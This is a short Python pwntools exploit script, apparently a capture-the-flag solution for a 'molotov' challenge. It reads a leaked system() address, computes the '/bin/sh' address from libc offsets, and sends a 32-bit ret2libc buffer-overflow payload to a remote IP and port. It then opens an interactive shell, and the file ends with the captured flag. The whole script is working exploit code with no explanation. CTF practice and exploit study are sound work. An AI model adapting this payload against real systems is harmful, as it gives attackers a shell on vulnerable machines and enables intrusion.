from pwn import *

local = 0

if local == 1 :
    p = process("./molotov")
    bin_offset = 0x17bb8f
    system_offset = 0x3cd80
else :
    p = remote("54.210.217.206",1240)
    bin_offset = 0x19042d
    system_offset = 0x0458b0

system = int(p.recvline()[:-1],16)
binsh = system-system_offset+bin_offset
#"/bin/sh" + \

log.info(hex(system))

payload = "a"*0x20 + \
        p32(system) + \
        "bbbb" + \
        p32(binsh)
        
pause()
p.sendlineafter("Input :",payload)
p.interactive()

#FwordCTF{good_j0b_pwn3r}